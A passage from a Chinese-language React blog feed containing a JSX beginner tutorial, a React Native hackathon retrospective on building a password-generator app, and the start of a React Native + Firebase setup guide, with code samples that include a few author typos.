如果 normalize 完之後的 key 不是Unidentified的話就回傳，否則再做進一步處理。
而這個進一步處理指的就是 polyfill，如果沒有 key 可以用的話就自己針對 charCode 或是 keyCode 來做處理，回傳相對應的字元或是按鍵名稱。
React 對於這些按鍵相關事件的處理就到這邊差不多了。
原始碼註解寫的很好，可以獲得很多相關資訊，而程式碼很短又不複雜，看起來也很輕鬆，是個很適合入門的切入點。
總結以前用了這麼多次這些按鍵相關事件，我自已卻從來沒想過這些的區別。要嘛就是隨意寫寫然後出 bug，要嘛就是直接從 stackoverflow 上面複製最佳解答，從來都不知道這些的差異。
這次剛好是因為要幫人解惑才去深入研究，沒想到一個簡單的按鍵事件其實也是水很深，可能要真的踩過雷才會更有感觸。最麻煩的其實是瀏覽器的相容性，各個瀏覽器可能都有自己不同的實作，要怎麼處理這些不同的情況才是麻煩的地方。
提到 React 原始碼，大家想到的可能都是 render 的相關機制或是 component 的處理，那些原始碼十分複雜，而且必須要對整體的架構有一定的理解才比較好看懂。
這篇選擇從 keyboard 的事件出發，來看 React 針對這部份的處理。相信程式碼大家都看得懂，也不會覺得特別難，就是想告訴大家若是你想研究其他人的原始碼，有時候不一定要整個專案都看懂，可以先從一些小地方開始下手。
從 utils 這種簡單的 function 開始也行，不一定要從最難的開始挑戰，你都能學到很多東西。
關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>react</tag>
      </tags>
  </entry>
  <entry>
    <title>一看就懂的 JSX 簡明入門教學指南</title>
    <url>/2016/04/21/react-jsx-introduction/</url>
    <content><![CDATA[
前言根據 React 官方定義，React 是一個構建使用者介面的 JavaScritp Library。以 MVC 模式來說，ReactJS 主要是負責 View 的部份。過去一段時間，我們被灌輸了許多前端分離的觀念，在前端三兄弟中（或三姊妹、三劍客）：HTML 掌管內容結構、CSS 負責外觀樣式，JavaScript 主管邏輯互動，千萬不要混在一塊。然而，在 React 世界裡，所有事物都是 以 Component 為基礎，將同一個 Compoent 相關的程式和資源都放在一起，而在撰寫 React Component 時我們通常會使用 JSX 的方式來提升程式撰寫效率。事實上，JSX 並非一種全新的語言，而是一種語法糖（Syntatic Sugar），一種語法類似 XML 的 ECMAScript 語法擴充。在 JSX 中 HTML 和組建這些元素標籤的程式碼有緊密的關係。因此你可能要熟悉一下以 Component 為單位的思考方式（本文主要使用 ES6 語法）。
此外，React 和 JSX 的思維在於善用 JavaScript 的強大能力，放棄蹩腳的模版語言，這和 Angular 強化 HTML 的理念也有所不同。當然 JSX 並非強制使用，你也可以選擇不用，因為最終 JSX 的內容會轉化成 JavaScript（瀏覽器只看的懂 JavaScript）。不過等你閱讀完接下來的內容，你或許會開始發現 JSX 的好，認真考慮使用 JSX 的語法。
一、使用 JSX 的好處1. 提供更加語意化且易懂的標籤由於 JSX 類似 XML 的語法，讓一些非開發人員也更容易看懂，且能精確定義包含屬性的樹狀結構。一般來說我們想做一個回饋表單，使用 HTML 寫法通常會長這樣：
&lt;form class=&quot;messageBox&quot;&gt;  &lt;textarea&gt;&lt;/teextarea&gt;  &lt;button type=&quot;submit&quot;&gt;&lt;/button&gt;&lt;/from&gt;

使用 JSX，就像 XML 語法結構一樣可以自行定義標籤且有開始和關閉，容易理解：
&lt;MessageBox /&gt;

React 思路認為使用 Component 比起模版（Template）和顯示邏輯（Display Logic）更能實現關注點分離的概念，而搭配 JSX 可以實現聲明式 Declarative（注重 what to），而非命令式  Imperative（注重 how to）的程式撰寫方式：

以 Facebook 上面按讚功能來說，若是命令式 Imperative 寫法大約會是長這樣：
if(userLikes()) &#123;  if(!hasBlueLike()) &#123;    removeGrayLike();    addBlueLike();  &#125;&#125; else &#123;  if(hasBlueLike()) &#123;    removeBlueLike();    addGrayLike();  &#125;&#125;

若是聲明式 Declarative 則是會長這樣：
if(this.state.liked) &#123;  return (&lt;BlueLike /&gt;);&#125; else &#123;  return (&lt;GrayLike /&gt;);&#125;

看完上述說明是不是感覺 React 結合 JSX 的寫法更易讀易懂？事實上，當 Component 組成越來越複雜時，若使用 JSX 將可以讓整個結構更加直觀，可讀性較高。
2. 更加簡潔雖然最終 JSX 會轉換成 JavaScript，但使用 JSX 可以讓程式看起來更加簡潔，以下為使用 JSX 和不使用 JSX 的範例：
&lt;a href=&quot;https://facebook.github.io/react/&quot;&gt;Hello!&lt;/a&gt;

不使用 JSX 的情況（記得我們說過 JSX 是選用的）：
// React.createElement(元件/HTML標籤, 元件屬性，以物件表示, 子元件)React.createElement(&#x27;a&#x27;, &#123;href: &#x27;https://facebook.github.io/react/&#x27;&#125;, &#x27;Hello!&#x27;)

3. 結合原生 JavaScript 語法JSX 並非一種全新的語言，而是一種語法糖（Syntatic Sugar），一種語法類似 XML 的 ECMAScript 語法擴充，所以並沒有改變 JavaScript 語意。透過結合 JavaScript ，可以釋放 JavaScript 語言本身能力。下面例子就是運用 map 方法和 Arrow function，輕易把 result 值迭代出來，產生無序清單（ul）的內容，不用再使用蹩腳的模版語言：
// const 為常數const lists = [&#x27;JavaScript&#x27;, &#x27;Java&#x27;, &#x27;Node&#x27;, &#x27;Python&#x27;];class HelloMessage extends React.Compoent &#123;  render() &#123;    return (    &lt;ul&gt;      &#123;lists.map((result) =&gt; &#123;        return (&lt;li&gt;&#123;result&#125;&lt;/li&gt;);      &#125;)&#125;    &lt;/ul&gt;);  &#125;&#125;

二、JSX 用法摘要1. 環境設定與使用方式初步了解為何要使用 JSX 後，我們來聊聊 JSX 的用法。一般而言 JSX 通常有兩種使用方式：

使用 browserify 或 webpack 等 CommonJS bundler 並整合 babel 預處理
於瀏覽器端做解析

在這邊簡單起見，我們先使用第二種方式，先讓大家專注熟悉 JSX 語法使用，等到後面章節再教大家使用 bundler 的方式去做解析（可以試著把下面的原始碼貼到 JSbin 的 HTML 看結果）：
&lt;!DOCTYPE html&gt;&lt;html&gt;  &lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot; /&gt;    &lt;title&gt;Hello React!&lt;/title&gt;    &lt;!-- 請先於 index.html 中引入 react.js, react-dom.js 和 babel-core 的 browser.min.js --&gt;    &lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/react/15.0.1/react.min.js&quot;&gt;&lt;/script&gt;    &lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/react/15.0.1/react-dom.min.js&quot;&gt;&lt;/script&gt;    &lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/babel-core/5.8.23/browser.min.js&quot;&gt;&lt;/script&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;div id=&quot;example&quot;&gt;&lt;/div&gt;    &lt;script type=&quot;text/babel&quot;&gt;      // 程式碼寫在這邊！      ReactDOM.render(        &lt;h1&gt;Hello, world!&lt;/h1&gt;,        document.getElementById(&#x27;example&#x27;)      );    &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;

一般載入 JSX 方式有：

內嵌

&lt;script type=&quot;text/babel&quot;&gt;  ReactDOM.render(    &lt;h1&gt;Hello, world!&lt;/h1&gt;,    document.getElementById(&#x27;example&#x27;)  );&lt;/script&gt;


從外部引入

&lt;script type=&quot;text/jsx&quot; src=&quot;main.jsx&quot;&gt;&lt;/script&gt; 
2. 標籤用法JSX 標籤非常類似 XML ，可以直接書寫。一般 Component 命名首字大寫，HTML Tags 小寫。以下是一個建立 Component 的 class：
class HelloMessage extends React.Compoent &#123;  render() &#123;    return (      &lt;div&gt;        &lt;p&gt;Hello React!&lt;/p&gt;        &lt;MessageList /&gt;      &lt;/div&gt;    );  &#125;&#125;

3. 轉換成 JavaScriptJSX 最終會轉換成瀏覽器可以讀取的 JavaScript，以下為其規則：
React.createElement(  string/ReactClass, // 表示 HTML 元素或是 React Component  [object props], // 屬性值，用物件表示  [children] // 接下來參數皆為元素子元素)

解析前（特別注意在 JSX 中使用 JavaScript 表達式時使用 {} 括起，如下方範例的 text，裡面對應的是變數。若需希望放置一般文字，請加上 &#39;&#39;）：
var text = &#x27;Hello React&#x27;;&lt;h1&gt;&#123;text&#125;&lt;/h1&gt;&lt;h1&gt;&#123;&#x27;text&#x27;&#125;&lt;/h1&gt;

解析完後：
var text = &#x27;Hello React&#x27;;React.createElement(&quot;h1&quot;, null, &quot;Hello React!&quot;);

另外要特別要注意的是由於 JSX 最終會轉成 JavaScript 且每一個 JSX 節點都對應到一個 JavaScript 函數，所以在 Component 的 render 方法中只能回傳一個根節點（Root Nodes）。例如：若有多個 &lt;div&gt; 要 render 請在外面包一個 Component 或 &lt;div&gt;、&lt;span&gt; 元素。
4. 註解由於 JSX 最終會編譯成 JavaScript，註解也一樣使用 // 和 /**/ 當做註解方式：
// 單行註解/*  多行註解*/var content = (  &lt;List&gt;      &#123;/* 若是在子元件註解要加 &#123;&#125;  */&#125;      &lt;Item        /* 多行           註解           喔 */        name=&#123;window.isLoggedIn ? window.name : &#x27;&#x27;&#125; // 單行註解      /&gt;  &lt;/List&gt;);

5. 屬性在 HTML 中，我們可以透過標籤上的屬性來改變標籤外觀樣式，在 JSX 中也可以，但要注意 class 和 for 由於為 JavaScript 保留關鍵字用法，因此在 JSX 中使用 className 和 htmlFor 替代。
class HelloMessage extends React.Compoent &#123;  render() &#123;    return (      &lt;div className=&quot;message&quot;&gt;        &lt;p&gt;Hello React!&lt;/p&gt;      &lt;/div&gt;    );  &#125;&#125;

Boolean 屬性在 JSX 中預設只有屬性名稱但沒設值為 true，例如以下第一個 input 標籤 disabled  雖然沒設值，但結果和下面的 input 為相同：
&lt;input type=&quot;button&quot; disabled /&gt;;&lt;input type=&quot;button&quot; disabled=&#123;true&#125; /&gt;;

反之，若是沒有屬性，則預設預設為 false：
&lt;input type=&quot;button&quot; /&gt;;&lt;input type=&quot;button&quot; disabled=&#123;false&#125; /&gt;;

6. 擴展屬性在 ES6 中使用 ... 是迭代物件的意思，可以把所有物件對應的值迭代出來設定屬性，但要注意後面設定的屬性會蓋掉前面相同屬性：
var props = &#123;  style: &quot;width:20px&quot;,  className: &quot;main&quot;,  value: &quot;yo&quot;,  &#125;&lt;HelloMessage  &#123;...props&#125; value=&quot;yo&quot; /&gt;// 等於以下React.createElement(&quot;h1&quot;, React._spread(&#123;&#125;, props, &#123;value: &quot;yo&quot;&#125;), &quot;Hello React!&quot;);

7. 自定義屬性若是希望使用自定義屬性，可以使用 data-：
&lt;HelloMessage data-attr=&quot;xd&quot; /&gt;

8. 顯示 HTML通常為了避免資訊安全問題，我們會過濾掉 HTML，若需要顯示的話可以使用：
&lt;div&gt;&#123;&#123;_html: &#x27;&lt;h1&gt;Hello World!!&lt;/h1&gt;&#x27;&#125;&#125;&lt;/div&gt;

9. 樣式使用在 JSX 中使用外觀樣式方法如下，第一個 &#123;&#125; 是 JSX 語法，第二個為 JavaScript 物件。與一般屬性值用 - 分隔不同，為駝峰式命名寫法：
&lt;HelloMessage style=&#123;&#123; color: &#x27;#FFFFFF&#x27;, fontSize: &#x27;30px&#x27;&#125;&#125; /&gt;

10. 事件處理事件處理為前端開發的重頭戲，在 JSX 中透過 inline 事件的綁定來監聽並處理事件（注意也是駝峰式寫法）：
&lt;HelloMessage onClick=&#123;this.onBtn&#125; /&gt;

總結以上就是 JSX 簡明入門教學，希望透過以上介紹，讓讀者了解在 React 中為何要使用 JSX，以及 JSX 基本概念和用法。最後為大家複習一下：在 React 世界裡，所有事物都是以 Component 為基礎，通常會將同一個 Compoent 相關的程式和資源都放在一起，而在撰寫 React Component 時我們常會使用 JSX 的方式來提升程式撰寫效率。JSX 是一種語法類似 XML 的 ECMAScript 語法擴充，可以善用 JavaScript 的強大能力，放棄蹩腳的模版語言。當然 JSX 並非強制使用，你也可以選擇不用，因為最終 JSX 的內容會轉化成 JavaScript。當相信閱讀完上述的內容後，你會開始認真考慮使用 JSX 的語法。
延伸閱讀
Imperative programming or declarative programming
JSX in Depth
從零開始學 React（ReactJS 101）

(image via adweek, codecondo)
關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>React, React Native, ES5, ES6, ES7, JavaScript, ECMAScript2015, Webpack, JSX</tag>
      </tags>
  </entry>
  <entry>
    <title>React Native in 24 Hours</title>
    <url>/2016/11/10/react-native-in-24-hours/</url>
    <content><![CDATA[

前言上個禮拜的時候，我們公司舉辦了一年一度的黑客松，一隊有四個人。因為我才剛加入公司大概兩個禮拜而已，所以也沒認識什麼人。不過，剛好當初找我進來的同事問我要不要一起參加，就跟著報名了。
黑客松的時間是禮拜五早上十一點到禮拜六同一時間，一共 24 個小時。我的三個隊友，一個是 PM、一個是資安部門、一個是 SA（System Admin） 部門。因此，在他們知道我現在是前端工程師，以前是 Android 工程師以後，理所當然地，Mobile App 的部分就由我負責了。
這也是這篇標題的由來：React Native in 24 hours，想跟大家分享在 24 小時之內，可以用 React Native 做出什麼樣的作品，以及過程中碰到的困難及挑戰。
Idea先簡單談一下我們這組那時候想做的東西，是一個 Password generator and manager。
大家都知道，記憶密碼是一件很麻煩的事情，所以，很多人會在每個網站都用同一組密碼。而大家也知道，這樣的壞處就是，當你其中一個網站的密碼外洩以後，其他網站也會跟著遭殃，這是一件滿可怕的事情。
因此有很多人會用密碼管理服務，只要記住這個服務的密碼，其他密碼都靠這個網站幫你儲存。可是，我的隊友覺得這樣依然會有問題，那就是這個網站仍然有安全性的風險。有沒有可能完全不儲存密碼呢？
有！那就是不要用儲存的，而是用「產生」的，只要有一套邏輯負責產生密碼，保證輸入一樣，輸出也一樣，就可以利用這一套邏輯每一次都產生密碼。
舉個例子，假設這套邏輯是
password = sha_256(root_password + domain_name + &#x27;I_AM_WEEK_SALT&#x27;)

這樣你只要有你的主密碼（root_password）跟你要登入的網站，就能幫你產生出一組獨特的密碼。
這就是這個產品的核心概念。
不過，上面那套邏輯有個問題是：假如我某個網站密碼外洩了，我想換一個，怎麼換？這時候又要引進一個新的參數叫做 changeID，是一個數字，把密碼產生的邏輯變成
password = sha_256(root_password + domain_name + changeID + &#x27;I_AM_WEEK_SALT&#x27;)

就可以任意更換無限次密碼。不過其實這樣，也頂多就是一個密碼生成器。當要加上「管理」的功能時，就比較麻煩了，例如說我們想要幫使用者儲存他的帳號，就可以自動填入。
因此我們就要有後端的 DB 去記錄這些資料，並且要有登入機制，而且一旦引入登入機制，就違反了「不想儲存任何密碼」的這個初衷。總之，在討論一些 feature 要不要做的時候，花了很多時間，討論了很久。
因為這些內容其實有點瑣碎，因此我就不多提了，如果你對這個概念有興趣，可以參考 LessPass。這跟我隊友想的 idea 有 87% 像，而且做得很完整，可以參考看看。
說好的 React Native 呢？好了，大概介紹完產品之後，終於要進入到 React Native 的部分。因為我之前有寫過 React + Redux 的網站，也有 run 過一次 React Native 的簡單範例（Hello World），所以對 React Native 不算陌生，至少能 build 的起來！
就讓我們先從這個 App 的第一頁開始吧！


這一頁很簡單，就是一張大張背景圖，上面放 logo 跟一些字，再加兩個按鈕跟一個可以點的「Join Now」。其實以前在寫 Android 的時候，最麻煩的不是程式碼，而是版面！直到現在，我還是覺得自己跟 Android 的 Layout 很不熟，沒辦法排出自己想要的版面。
但是現在我們有了 React Native，有了新的排版方式：flexbox。
如果你不知道什麼是 flexbox，我可以很簡單的介紹一下，基本上就是你可以選擇你要直的排還是橫的排、要靠上靠下對齊還是置中、空隙應該怎麼分配、每個版面佔多少比例等等。我自己覺得是個滿直覺的排版方式。
以上面那個版面為例，就可以用直的來排，然後按照比例分成四塊，按鈕那個區塊內部用橫的排，然後切對半：


其實這就很像 React 用 component 來切的概念，切成很多很多細小的組件再合在一起。
我當初寫 code 的時候，都把這個分頁開在旁邊，是很淺顯易懂的圖片說明，可以很方便的就找到自己想要的排版方式應該怎麼用。
至於在按鈕的部分，我是用 APSL&#x2F;react-native-button 這個第三方的套件，但詳細原因我也忘記了，可能是用原生的碰到什麼問題，所以去找了第三方的來用。
這邊附上最後寫出來的部分程式碼：
render() &#123;  return (    &lt;View style=&#123;styles.container&#125;&gt;      &lt;View style=&#123;styles.bgImageWrapper&#125;&gt;        &lt;Image source=&#123;require(&#x27;../img/bg.png&#x27;)&#125; style=&#123;styles.bg&#125; /&gt;      &lt;/View&gt;      &lt;Image source=&#123;require(&#x27;../img/logo-white.png&#x27;)&#125; style=&#123;styles.image&#125;/&gt;      &lt;Text style=&#123;styles.text&#125;&gt;Only you have your password&lt;/Text&gt;      &lt;View style=&#123;styles.btnGroup&#125;&gt;        &lt;Button style=&#123;styles.btnGuest&#125; textStyle=&#123;&#123;fontSize: 18, color: &#x27;white&#x27;&#125;&#125; onPress=&#123;this.onGuestClick.bind(this)&#125;&gt;          Use as guest        &lt;/Button&gt;        &lt;Button style=&#123;styles.btnSignIn&#125; textStyle=&#123;&#123;fontSize: 18, color: &#x27;white&#x27;&#125;&#125; onPress=&#123;this.onSignInClick.bind(this)&#125;&gt;          Sign in        &lt;/Button&gt;      &lt;/View&gt;      &lt;Text style=&#123;styles.textJoin&#125; onPress=&#123;this.onJoinClick.bind(this)&#125;&gt;Join now&lt;/Text&gt;    &lt;/View&gt;  );&#125;

這邊有兩點要提一下，第一點是 textStyle 的部分最好也先宣告成變數再使用，但因為是黑客松所以比較少時間去做這些調整，就比較不好的直接這樣寫了。第二點是this.onGuestClick.bind(this)這樣的方式其實不好，但不知道為什麼，我沒辦法在constructor裡面先bind，所以只好這樣寫了。
其實只要能把這個 render 的函式寫出來，這一頁就看起來有模有樣了，可是問題是，我們還有其他很多頁。要怎麼切換到別的畫面呢？
Navigator如果要在多個畫面之間切換，就要靠Navigator這個組件了。從官方文件可以大致看出用法，或是可以參考別人寫的教學。
直接附上程式碼再來解釋
import React, &#123; Component &#125; from &#x27;react&#x27;;import &#123;  Navigator&#125; from &#x27;react-native&#x27;;import MainScene from &#x27;./scenes/MainScene&#x27;;export default class Zeropass extends Component &#123;  render() &#123;    var defaultName = &quot;MainScene&quot;;    var defaultComp = MainScene;    return (      &lt;Navigator        initialRoute=&#123;&#123;          name: defaultName,          component: defaultComp        &#125;&#125;        configureScene=&#123;(route) =&gt; &#123;          return Navigator.SceneConfigs.PushFromRight;        &#125;&#125;        renderScene=&#123;(route, navigator) =&gt; &#123;          var Component = route.component;          return (            &lt;Component &#123;...route.params&#125; navigator=&#123;navigator&#125; /&gt;          );        &#125;&#125;      /&gt;    )  &#125;&#125;

initialRoute就是一開始的時候要給什麼參數，可以想成是 defaultState 的感覺，configureScene是跟換場動畫有關係的，這邊直接用內建的PushFromRight，會有一個還不錯的從右邊推進來的效果。
renderScene則是精華所在，就是Navigator的render函式，說明應該要渲染出什麼東西。
這邊先取route.component，這個component對應到的就是我在initialRoute這邊給的component這個 key，之後如果要換頁的話也要用這個 key 帶東西進來。
並且傳入navigator讓組件可以呼叫，以及加上...route.params，就可以帶額外的參數進來。
這只是最基礎的架構而已，但實際上如果要換頁，應該要怎麼寫呢？
toNext() &#123;  const &#123; navigator &#125; = this.props;  if(navigator) &#123;    navigator.push(&#123;      name: &#x27;GuestLoginScene&#x27;,      component: GuestLoginScene,    &#125;)  &#125;&#125;

因為在renderScene的時候，我們有把navigator傳進去，所以在每一個 component 都可以用 this.props 取出來，想要換頁的話就只要 push 一個物件進去就好了。物件的格式自己決定好就行了。所以你會發現這邊的格式跟剛剛initialRoute傳進去的格式一模一樣。
好了，所以第一頁完成了、換頁的問題也解決了。剩下的就是把其它頁面刻出來，好像就差不多了。前途真是一片光明璀璨，看來 24 小時太多了。
等等，可是我們還有 Tab 啊

當初在做這個頁面的時候，原本的設計是 DrawerLayout，就是 Android 風格的從左邊滑出來的列表。可是因為在做這個 App 時想要跨平台通吃，所以 Drawer 方案可見是行不通的。況且，我看了一下官方文件，實作上感覺也沒那麼簡單。
因此，最後找了第三方套件的react-native-tab-view來用。因為無論在 iOS 或是在 Android，都可以看到 Tab 的出現，所以會比 Drawer 更好一些。
這個 Tabview 的用法相當簡單，客製化程度滿高的，只要自己實作幾個函式就好。
const icons = &#123;  account: require(&#x27;../img/icon_account.png&#x27;),  edit: require(&#x27;../img/icon_edit.png&#x27;),  setting: require(&#x27;../img/icon_setting.png&#x27;),  help: require(&#x27;../img/icon_help.png&#x27;),&#125;export default class TabViewExample extends Component &#123;  constructor(props) &#123;    super(props);  &#125;  state = &#123;    index: 0,    routes: [      &#123; key: &#x27;account&#x27;, title: &#x27;Account&#x27;, icon: &#x27;account&#x27;&#125;,      &#123; key: &#x27;new&#x27;, title: &#x27;Create&#x27;, icon: &#x27;edit&#x27; &#125;,      &#123; key: &#x27;setting&#x27;, title: &#x27;Setting&#x27;, icon: &#x27;setting&#x27; &#125;,      &#123; key: &#x27;help&#x27;, title: &#x27;Help&#x27;, icon: &#x27;help&#x27; &#125;,    ],  &#125;;  _handleChangeTab = (index) =&gt; &#123;    this.setState(&#123; index &#125;);  &#125;;  _renderIcon = (&#123; route &#125;) =&gt; &#123;    return (      &lt;Image        source=&#123;icons[route.icon]&#125;        style=&#123;styles.icon&#125;        color=&#x27;white&#x27;      /&gt;    );  &#125;;  _renderHeader = (props) =&gt; &#123;    return (      &lt;TabBar         renderIcon=&#123;this._renderIcon&#125;        tabStyle=&#123;styles.tab&#125;         labelStyle=&#123;styles.label&#125;        &#123;...props&#125; /&gt;    );  &#125;;  _renderScene = (&#123; route &#125;) =&gt; &#123;    console.log(route.key);    switch (route.key) &#123;      case &#x27;account&#x27;:        return &lt;AccountTab /&gt;;      case &#x27;new&#x27;:        return &lt;CreateTab /&gt;;      case &#x27;help&#x27;:        return &lt;HelpTab /&gt;;      case &#x27;setting&#x27;:        return &lt;SettingTab /&gt;;      default:        return null;    &#125;  &#125;;  render() &#123;    return (        &lt;TabViewAnimated          style=&#123;styles.container&#125;          navigationState=&#123;this.state&#125;          renderScene=&#123;this._renderScene&#125;          renderFooter=&#123;this._renderHeader&#125;          onRequestChangeTab=&#123;this._handleChangeTab&#125;        /&gt;    );  &#125;&#125;

跟Navigator其實有異曲同工之妙，都是靠renderScene這個函式去決定如何渲染出畫面。在這邊就很簡單的根據目前所選到的 key 去渲染出相對應的組件即可。
可是，假如 Tab 的頁面也是巢狀的呢？例如說我第一個 Tab 可能是輸入密碼的畫面，輸入完按下確定之後話跳到下一個畫面，這個要怎麼做呢？
我自己猜應該是也可以用navigator來做，在renderScene的時候渲染出navigator，其他的就跟我們剛開頭介紹的差不多。
意思就是，每一個 Tab 其實都像是一個小的 App，有自己的navigator來管理自己的狀態。
但是在黑客松的時候，我一時半刻沒有想到這樣的解法，於是就手刻了一個最直覺、最暴力的。
import SiteScene from &#x27;./SiteScene&#x27;;import PasswordScene from &#x27;./PasswordScene&#x27;;export default class CreateTab extends Component &#123;  constructor(props) &#123;    super(props);        // 2 page    this.state = &#123;      page: 1,      site: &#x27;&#x27;    &#125;  &#125;  goBack() &#123;    this.setState(&#123;      page: 1    &#125;)  &#125;  toNext(site) &#123;    this.setState(&#123;      ...this.state,      page: 2,      site    &#125;)  &#125;  render() &#123;    const &#123; page, site &#125; = this.state;    return (        &lt;View style=&#123;styles.container&#125;&gt;          &lt;View style=&#123;styles.top&#125;&gt;            &lt;Text style=&#123;styles.back&#125; onPress=&#123;this.goBack.bind(this)&#125;&gt;              &#123; page==2 ? &#x27; ← &#x27; : &#x27; &#x27; &#125;            &lt;/Text&gt;          &lt;/View&gt;          &#123;page==1 &amp;&amp; &lt;SiteScene toNext=&#123;this.toNext.bind(this)&#125;/&gt;&#125;          &#123;page==2 &amp;&amp; &lt;PasswordScene site=&#123;site&#125;/&gt;&#125;        &lt;/View&gt;    );  &#125;&#125;;

在 tab 裡面用 state 來管理目前的 index，因為只有兩個頁面所以還滿好做的，根據 index 渲染出相對應的頁面即可。然後還可以用一個簡單的 navbar 包起來，就可以點上面的箭頭回到上一頁。




就這樣，tab 的問題也解決了。看起來一切都 work 的不錯，可以自由自在在各個頁面之間切換自如了。接下來，好像就只剩下串 API 了。
API因為有支援 async&#x2F;await 語法，所以寫起來十分清爽。下面這一段程式碼是要去 server 抓取使用者儲存過資訊的 domain 回來。為了方便起見，我把所有的 API call 都包在API這個檔案裡面，用fetch去拿資料。
const API_URL = &#123;    &#x27;getInfo&#x27;: &#x27;http://api.com/api/v1/users&#x27;,&#125;const API = &#123;  getInfo: async function(uid) &#123;    let response = await fetch(`$&#123;API_URL.getInfo&#125;/$&#123;uid&#125;`);    let json = await response.json();    return json;  &#125;&#125;export default API;

async componentDidMount() &#123;  let domains = [];  this.setState(&#123;    spinnerShow: true  &#125;);  try &#123;    const response = await API.getInfo(store.getId());    domains = response.domains;  &#125; catch(err) &#123;    console.log(err);  &#125;  this.setState(&#123;    dataSource: ds.cloneWithRows(domains),    spinnerShow: false  &#125;)&#125;

（不過我後來想一下，這樣子把componentDidMount直接包成 async 好像不太好，應該獨立成一個函式去呼叫）
體驗跨平台的威力因為我自己是用 Android 的，所以我在開發的時候都是直接用 Android 實機測試。不得不提已經被講到爛掉的，React Native 的 hot reload，用起來真的很爽快，只要儲存檔案之後就可以在 App 上看到新的畫面。（雖然原生的 Android 現在也支援了，但我還沒有機會體驗到就是了）
其實原本我的隊友只有預期我開發出 Android 的版本（他們都用 iPhone），但殊不知 React Native 太過強大，當我把 App 開發到九成的時候，想說來試試看 build 到 iOS 上好了，發現跟我想像中的不一樣。
我以為要 build 的時候應該會碰到很多錯誤然後要慢慢修，或者是沒有 Apple 的開發者帳號就沒辦法 build 到手機上之類的。
但我完完全全錯了。React Native 就是那麼簡單，超級輕鬆就可以有一個 iOS 的版本。也根本不用什麼 Apple 開發者帳號，就可以安裝到手機上面測試（只是要開一些安全性設定就是了）。
在 build 的時候是有碰到一點小問題，但拜過 Google 大神之後基本上就解決了。
（不過會那麼輕鬆，也是因為我基本上沒用到 Native 的功能，排版也是兩個平台都長一模一樣，所以可以共用 100% 的程式碼。）
除了 iOS 很輕鬆以外，Android 如果要產生可以上 Google play 的安裝包也很容易，官方教學寫的超級清楚，就參數填一填以後打個指令，剩下的全部都幫你做好。
結論這篇文章主要是想分享一下當初碰到的困難以及開發的歷程，花最久時間的是排版（因為對 flexbox 沒那麼熟，所以不知道排出來會是怎樣），還有 Tab 那一段也花了一點時間研究作法。但總體來說，我覺得 React Native 的開發效率是很高的。
因為我中間有睡覺，所以實際上 coding 應該 18 個小時左右，就可以做出一個可以動、有接 API 又跨平台的 App。意思就是說如果你的 App 沒有很複雜的話，基本上是可以在兩三天之內就做出一個還不錯的 prototype。
只要掌握幾個元素：View, Button, Image, Navigator, ListView, TextInput，差不多就可以完成 80% 的工作了。
我最喜歡的還是它的排版方式，對前端工程師來說比較熟悉。開發環境的設置我覺得也比 Native 的簡單許多，而且可以用 JavaScript 我覺得也是一大好處。
之前看了那麼多 React Native 的介紹文，我覺得最快速能認識的方式還是自己跳下去寫 code。如果大家假日有空的話，也可以試試看來場自己一個人的黑客松，挑戰在 24 小時以內用 React Native 做出一個簡單的 App，相信一定會很有收穫的。
最後，附上這個 App 的 Github：zeropass-react-native如果有興趣的話可以參考看看（因為時間緊迫，所以很多東西都是只求能動就好，很多都是錯誤示範，真的只是「僅供參考」）
關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>react, react_native, android</tag>
      </tags>
  </entry>
  <entry>
    <title>一看就懂的 React Native + Firebase Mobile App 入門教學</title>
    <url>/2016/09/10/react-native-redux-android-firebase/</url>
    <content><![CDATA[
前言跨平台（Wirte once, Run Everywhere）一直以來是軟體工程的聖杯。過去一段時間市場上有許多嘗試跨平台開發原生行動裝置（Native Mobile App）的解決方案，嘗試運用 HTML、CSS　和 JavaScript 等網頁前端技術達到跨平台的效果，例如：運用 jQuery Mobile、Ionic 和 Framework7 等 Mobile UI 框架（Framework）結合 JavaScript 框架並搭配 Cordova&#x2F;PhoneGap 進行跨平台行動裝置開發。然而，因為這些解決方案通常都是運行在 WebView 之上，導致效能和體驗要真正趨近於原生應用程式（Native App）還有一段路要走。
不過，隨著 Facebook 工程團隊開發的 React Native 橫空出世，想嘗試跨平台解決方案的開發者又有了新的選擇。
React Native 特色在正式開始開發 React Native App 之前我們先來介紹一下 React Native 的主要特色：

使用 JavaScript（ES6+）和 React 打造跨平台原生應用程式（Learn once, write anywhere）
使用 Native Components，更貼近原生使用者體驗
在 JavaScript 和 Native 之間的操作為非同步（Asynchronous）執行，並可用 Chrome 開發者工具除錯，支援 Hot Reloading
使用 Flexbox 進行排版和布局
良好的可擴展性（Extensibility），容易整合 Web 生態系標準（XMLHttpRequest、 navigator.geolocation 等）或是原生的元件或函式庫（Objective-C、Java 或 Swift）  
Facebook 已使用 React Native 於自家 Production App 且將持續維護，另外也有持續蓬勃發展的技術社群
讓 Web 開發者可以使用熟悉的技術切入 Native App 開發
2015&#x2F;3 釋出 iOS 版本，2015&#x2F;9 釋出 Android 版本
目前更新速度快，平均每兩週發佈新的版本。社群也還持續在尋找最佳實踐，關於版本進展可以參考這個文件
支援的作業系統為 &gt;&#x3D; Android 4.1 (API 16) 和 &gt;&#x3D; iOS 7.0

React Native 初體驗在了解了 React Native 特色後，我們準備開始開發我們的 React Native 應用程式！由於我們的範例可以讓程式跨平台共用，所以你可以使用 iOS 和 Android 平台運行。不過若是想在 iOS 平台開發需要先準備 Mac OS 和安裝 Xcode 開發工具，若是你準備使用 Android 平台的話建議先行安裝 Android Studio 和 Genymotion 模擬器。在我們範例我們使用筆者使用的 MacO OS 作業系統並使用 Android 平台為主要範例，若有其他作業系統需求的讀者可以參考 官方安裝說明。
一開始請先安裝 Node、Watchman 和 React Native command line 工具：
// 若你使用 Mac OS 你可以使用官網安裝方式或是使用 homebrew 安裝$ brew install node// watchman 可以監看檔案是否有修改$ brew install watchman
